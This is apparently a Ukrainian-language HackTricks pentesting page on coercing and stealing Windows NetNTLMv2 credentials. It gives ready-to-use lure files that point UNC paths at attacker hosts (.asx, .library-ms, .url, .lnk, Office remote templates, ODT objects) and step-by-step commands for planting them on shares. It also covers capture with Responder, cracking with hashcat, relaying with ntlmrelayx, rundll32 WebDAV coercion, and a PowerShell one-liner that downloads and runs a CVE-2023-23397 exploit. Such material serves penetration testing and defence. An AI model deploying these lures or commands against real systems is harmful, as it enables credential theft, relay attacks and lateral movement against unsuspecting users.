# Місця для викрадення облікових даних NTLM

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/): від завантаження онлайн-файлу Microsoft Word до джерела витоків NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md та [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Доступний для запису SMB share + приманки UNC, які запускає Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **записувати в share, який користувачі або заплановані завдання переглядають в Explorer**, розмістіть файли, метадані яких вказують на ваш UNC (наприклад, `\\ATTACKER\share`). Відображення папки запускає **неявну автентифікацію SMB** і надсилає **NetNTLMv2** вашому слухачу.<sup>[[1]](#references)</sup>

1. **Створіть приманки** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF тощо)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Розмістіть їх у спільному ресурсі з правом запису** (у будь-якій папці, яку відкриває жертва):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Прослухати й зламати**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows може звертатися до кількох файлів одночасно; для всього, що Explorer попередньо переглядає (`BROWSE TO FOLDER`), не потрібно нічого натискати.

### Списки відтворення Windows Media Player (.ASX/.WAX)

Якщо вдасться змусити ціль відкрити або попередньо переглянути контрольований вами список відтворення Windows Media Player, можна отримати Net‑NTLMv2, указавши UNC-шлях для запису. WMP спробує отримати вказаний медіафайл через SMB і автентифікується автоматично.<sup>[[3]](#references)[[4]](#references)</sup>

Приклад payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Процес збору та зламу:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Витік NTLM через .library-ms у ZIP-архіві (CVE-2025-24071/24055)

Windows Explorer небезпечно обробляє файли .library-ms, коли їх відкривають безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений шлях UNC (наприклад, \\attacker\share), достатньо переглянути/запустити файл .library-ms в архіві ZIP, щоб Explorer виконав перелік вмісту UNC-шляху та надіслав зловмиснику дані автентифікації NTLM. У результаті зловмисник отримує NetNTLMv2, який можна зламати офлайн або потенційно передати через relay.<sup>[[2]](#references)</sup>

Мінімальний файл .library-ms, що вказує на UNC-шлях зловмисника

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Операційні кроки
- Створіть файл .library-ms із наведеним вище XML (вкажіть свою IP-адресу/ім’я хоста).
- Заархівуйте його (у Windows: Надіслати → Стиснута ZIP-папка) і передайте ZIP цілі.
- Запустіть listener для перехоплення NTLM і дочекайтеся, поки жертва відкриє файл .library-ms із ZIP-архіву.


### Шлях до звукового файлу нагадування календаря Outlook (CVE-2023-23397) — zero-click leak Net-NTLMv2

Microsoft Outlook для Windows обробляв розширену властивість MAPI PidLidReminderFileParameter в елементах календаря. Якщо ця властивість вказувала на UNC-шлях (наприклад, \\attacker\share\alert.wav), Outlook підключався до спільного ресурсу SMB, коли спрацьовувало нагадування, і без жодного кліку спричиняв leak Net-NTLMv2 користувача. Це виправили 14 березня 2023 року, але проблема досі дуже актуальна для застарілих/неоновлених систем і ретроспективного реагування на інциденти.<sup>[[5]](#references)</sup>

Швидка експлуатація за допомогою PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

На боці слухача:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Нотатки
- Для спрацювання нагадування достатньо, щоб на комп’ютері жертви була запущена Outlook для Windows.
- leak дає Net‑NTLMv2, придатний для офлайн-крекінгу або relay (але не для pass-the-hash).


### .LNK/.URL zero-click NTLM leak на основі іконок (CVE‑2025‑50154 – обхід CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки ярликів. Нещодавні дослідження показали, що навіть після квітневого патча Microsoft 2025 року для ярликів із UNC-іконками все ще можна було запустити NTLM-аутентифікацію без жодних натискань: для цього ціль ярлика розміщували за UNC-шляхом, а іконку залишали локальною (обхід патча отримав ідентифікатор CVE‑2025‑50154). Достатньо просто відкрити папку, щоб Explorer отримав метадані з віддаленої цілі й надіслав NTLM на SMB-сервер зловмисника.<sup>[[6]](#references)</sup>

Мінімальний payload Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Створення payload ярлика програми (.lnk) за допомогою PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ідеї доставки
- Помістіть ярлик у ZIP-архів і змусьте жертву відкрити його.
- Розмістіть ярлик на доступному для запису мережевому ресурсі, який відкриє жертва.
- Додайте до тієї самої папки інші файли-приманки, щоб Explorer попередньо переглядав її вміст.

### NTLM leak без натискання через шлях до значка ExtraData (.LNK, CVE‑2026‑25185)

Windows завантажує метадані `.lnk` під час **перегляду/попереднього перегляду** (відображення значка), а не лише під час запуску. CVE‑2026‑25185 демонструє шлях обробки, за якого блоки **ExtraData** змушують shell визначити шлях до значка й звернутися до файлової системи **під час завантаження**, надсилаючи вихідну NTLM-автентифікацію, якщо шлях веде до віддаленого ресурсу.

Ключові умови спрацювання (зафіксовані в `CShellLink::_LoadFromStream`):
- Додайте **DARWIN_PROPS** (`0xa0000006`) до ExtraData (це вмикає процедуру оновлення значка).
- Додайте **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) із заповненим **TargetUnicode**.
- Завантажувач розгортає змінні середовища в `TargetUnicode` і викликає `PathFileExistsW` для отриманого шляху.

Якщо `TargetUnicode` вказує на UNC-шлях (наприклад, `\\attacker\share\icon.ico`), **самого лише перегляду папки** з ярликом достатньо, щоб спричинити вихідну автентифікацію. Той самий шлях завантаження може також спрацьовувати під час **індексації** та **сканування антивірусом**, створюючи практичну поверхню для NTLM leak без натискання.<sup>[[7]](#references)</sup>

Інструменти для досліджень (парсер/генератор/інтерфейс) доступні в проєкті **LnkMeMaybe** — вони дають змогу створювати й переглядати ці структури без використання графічного інтерфейсу Windows.<sup>[[8]](#references)</sup>


### Примусова автентифікація WebDAV / перевірка облікових даних через `davclnt.dll,DavSetCookie`

Вбудований **клієнт WebDAV** можна використати, щоб змусити поточний сеанс входу автентифікуватися на довільному кінцевому пункті **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Чому це корисно:
- Проти **WebDAV-сервера під контролем зловмисника** це дає змогу ініціювати **NTLM через HTTP**, не розгортаючи власний клієнт.
- Проти **внутрішніх хостів** це непомітний спосіб **перевірити, де приймаються викрадені облікові дані**, перш ніж перейти до латерального переміщення.<sup>[[9]](#references)</sup>
- Ця команда — хороша альтернатива, коли **вихідний трафік SMB фільтрується**, але **HTTP/WebDAV** усе ще доступний.

Операційні примітки:
- На вихідному хості має бути запущена служба **WebClient**.
- `rundll32.exe` завантажує `davclnt.dll` і змушує Windows виконати автентифікацію WebDAV з використанням **облікових даних поточного користувача**.<sup>[[10]](#references)</sup>
- Якщо вказуєте інфраструктуру, яку контролюєте, використовуйте HTTP-слухач/ретранслятор із підтримкою NTLM, наприклад:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

З погляду виявлення, повторні запуски `rundll32.exe davclnt.dll,DavSetCookie` проти багатьох внутрішніх систем є сильним сигналом **перевірки облікових даних / підготовки до lateral movement, схожої на password spraying**, а не звичайної поведінки користувача.<sup>[[9]](#references)[[11]](#references)</sup>

### Віддалені URI сповіщень для примусового отримання NTLM через WebDAV

Якщо застосунок переходить за віддалено налаштованими адресами спливних вікон або вебподань, адреса `file://` може примусити вихідну автентифікацію **без відкриття документа чи виконання payload**. У випадку AOMEI сповіщення розміром в один піксель вказувало на віддалений шлях WebDAV `DavWWWRoot`. Windows спробувала виконати інтегровану автентифікацію за цією адресою, розкривши challenge-response NetNTLMv2. Тригером було розіменування URI, а не видимість спливного вікна; це також залежить від обробника URI застосунку, [поведінки Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) та політики вихідної автентифікації.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

На відміну від описаного вище примусу за допомогою команд, ця точка входу потребує контролю над [конфігурацією програмних сповіщень](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Однопіксельне вікно та високий пріоритет показують, що навіть непомітне сповіщення може змусити клієнт розіменувати URI.<sup>[[16]](#references)</sup>

### Примус NTLM через ін’єкцію віддаленого шаблону Office (.docx/.dotm)

Документи Office можуть посилатися на зовнішній шаблон. Якщо вказати UNC-шлях як прикріплений шаблон, під час відкриття документа відбудеться автентифікація через SMB.

Мінімальні зміни зв’язків DOCX (усередині word/):

1) Відредагуйте word/settings.xml і додайте посилання на прикріплений шаблон:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Відредагуйте word/_rels/settings.xml.rels і вкажіть для rId1337 свій UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Перепакуйте у `.docx` і передайте файл. Запустіть SMB-слухач для перехоплення облікових даних і дочекайтеся відкриття файла.

### Зовнішній об’єкт ODT для автентифікації SMB

Якщо шлях завантаження документів приймає `.odt`, але цільова система не відкриває файли Office `.docx`, використайте зовнішній об’єкт OpenDocument замість шаблону Office. Metasploit's `auxiliary/fileformat/odt_badodt` створює ODT, у якому `content.xml` містить посилання `draw:object` із дією під час відкриття, як у прикладі нижче. Установіть `LHOST` на адресу SMB-слухача, завантажте ODT через дозволений процес і перехопіть вихідну відповідь NetNTLMv2, коли користувач або обробник документів відкриє файл. Перевірка розширення файла не аналізує вбудовану URL-адресу; обмеження вхідного NTLM на цільовій системі не обов’язково зупиняють вихідну автентифікацію.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Щодо ідей після захоплення для ретрансляції або зловживання NTLM див.:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Приманки через спільний ресурс із правом запису + захоплення Responder → злам NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 до DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → точка з’єднання NTFS до webroot RCE → FullPowers + GodPotato до SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 вразливостей NTLM: невиправлені загрози підвищення привілеїв у Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft усуває вразливість підвищення привілеїв в Outlook (CVE‑2023‑23397) і пояснює витік NTLM через PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, один NTLM: обхід виправлення безпеки Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: огляд CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Інструментарій TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Коли телефонує IT-підтримка: аналіз кампанії ModeloRAT від Teams до компрометації домену](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – заголовок davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – запит WebDAV через Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com — Цікаві місця для викрадення хешів NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [p0dalirius/windows-coerced-authentication-methods](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — захоплення NTLM через зовнішній об’єкт ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group і Mandiant – Розслідування тимчасового втручання в ланцюг постачання](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
